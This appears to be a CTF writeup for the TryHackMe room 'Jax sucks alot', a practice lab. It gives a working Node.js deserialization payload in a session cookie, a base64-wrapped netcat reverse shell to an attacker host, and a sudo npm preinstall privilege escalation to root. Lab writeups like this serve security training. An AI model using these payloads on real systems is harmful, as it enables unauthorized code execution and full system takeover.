---
title: "Jax sucks alot............."
date: 2025-02-16
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF Jax sucks alot
categories: [TryHackMe, Easy]
tags: [linux, node, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Plattform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Jax sucks alot.............</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>In JavaScript everything is a terrible mistake.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/jason">https://tryhackme.com/room/jason</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Jax sucks alot..............  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.26.215
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-16 05:33 EST
  Nmap scan report for 10.10.26.215
  Host is up (0.058s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

  Nmap done: 1 IP address (1 host up) scanned in 21.24 seconds
```

From here I proceeded the analysis with port 80.

## Port 80 Analysis

The website displays an input field for subscribing to a newsletter. 

![Newsletter Subscription Page](/assets/img/tryhackme/Jason/thm_jason_1.jpg)

Upon inspecting the source code, I noticed that the input was converted and stored as a cookie. This cookie was added as a session cookie to every request. I checked the request, and it appeared to be a `base64` encoded string:

![Cookie inside request](/assets/img/tryhackme/Jason/thm_jason_2.jpg)

```bash
$ echo "eyJlbWFpbCI6InRlc3RAdGVzdC5kZSJ9" | base64 -d                                        
{"email":"test@test.de"} 
```

After some research, I came across information about Node.js deserialization attacks. Before attempting to get a reverse shell, I created a small proof of concept:
```bash
<@base64>{"email":"_$$ND_FUNC$$_function(){\n \t require('child_process').exec('ping -c 1 [attackerip]',function(error, stdout, stderr) { console.log(stdout) });\n }()"}</@base64>
```

This payload should send me an `icmp` packet upon execution:
```bash
$ sudo tcpdump -i tun0 icmp                     
  tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
  listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
  13:19:05.578402 IP 10.10.119.248 > [attackerip]: ICMP echo request, id 1, seq 1, length 64
  13:19:05.578413 IP [attackerip] > 10.10.119.248: ICMP echo reply, id 1, seq 1, length 64
```

Great! Now we can use this to gain a reverse shell. I started `penelope` and pressed option `p` to retrieve predefined payloads. By coping the penelope payload into the previous NodeJS deserialization attack, I was able to obtain a reverse shell:
```bash
@base64>{"email":"_$$ND_FUNC$$_function(){\n \t require('child_process').exec('echo -n cm0gL3RtcC9fO21rZmlmbyAvdG1wL187Y2F0IC90bXAvX3xzaCAyPiYxfG5jIGF0dGFja2VyaXAgNDQ0NCA+L3RtcC9fICYK|base64 -d|sh',function(error, stdout, stderr) { console.log(stdout) })
```

After receiving the reverse shell, I was able to retrieve the user flag::
```bash
dylan@jason:~$ cd /home/dylan/
dylan@jason:~$ cat user.txt 
	[removed]
```

## Privilege Escalation root

Next, I ran `sudo -l` and got the following output:
```bash
dylan@jason:~$ sudo -l
  Matching Defaults entries for dylan on jason:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User dylan may run the following commands on jason:
      (ALL) NOPASSWD: /usr/bin/npm *
```

A quick search on <a href="https://gtfobins.github.io/gtfobins/npm/#sudo">gftobins</a> provided all the information I needed:
```bash
dylan@jason:~$ TF=$(mktemp -d)
dylan@jason:~$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
dylan@jason:~$ sudo npm -C $TF --unsafe-perm i

> @ preinstall /tmp/tmp.oKtTgZ2Zvd
> /bin/sh

# whoami
	root
# cat /root/root.txt
	[removed]
```

solved! :)
